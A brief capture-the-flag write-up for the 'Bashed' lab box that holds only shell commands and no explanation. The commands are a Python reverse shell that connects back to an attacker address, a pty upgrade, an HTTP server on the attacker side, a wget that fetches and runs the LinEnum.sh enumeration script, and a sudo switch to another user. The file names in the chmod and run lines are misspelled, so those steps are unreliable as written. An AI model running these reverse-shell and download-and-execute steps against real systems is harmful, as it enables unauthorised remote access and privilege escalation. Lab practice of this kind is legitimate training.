## Writeup and notes for the Bashed box.

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

```shell
python3 -m http.server 8000
```

```shell
wget 10.10.14.25:8000/LinEnum.sh
chmod +x LinsEnum.sh
./LinEnsum.sh 
```

```shell 
sudo -u scriptmanager /bin/bash
```
